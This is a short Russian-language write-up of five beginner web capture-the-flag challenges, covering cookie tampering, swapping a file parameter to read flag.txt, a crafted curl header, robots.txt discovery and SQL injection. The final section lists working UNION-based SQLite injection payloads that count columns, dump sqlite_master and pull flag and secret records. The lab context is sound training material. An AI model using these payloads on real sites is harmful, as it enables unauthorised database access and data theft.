![image](https://github.com/user-attachments/assets/995f0e4a-dcfa-4e0e-9429-b88bc4acd2d7)

#### 1. Cookie Lover

Декодируем куки, меняем **false** на **true** и получаем флаг.

---

#### 2. Смешной мем

Через код страницы открываем мем, меняем параметр **file** на **flag.txt**.

---

#### 3. Заголовки

Через **curl** отправляем требуемый запрос с заголовком, подсказка в **HTML** комментарии.

---

#### 4. Трансформеры

В **robots.txt** находим **HTML** страничку с флагом.

---

#### 5. Тайная сила

Используем **SQL инъекцию**, решить можно было, например, так:

```
%' order by 6; --

%' order by 5; --

%' AND 1=0 UNION SELECT name, sql, 3, 4, 5 FROM sqlite_master; --

%' and 1=0 UNION SELECT flag, 2, 3, 4, 5 FROM the_flag_is_in_here; --

%' and 1=0 UNION SELECT name, secret_power, 3, 4, 5 FROM secret_powers where name='Tony Stark'; --
```
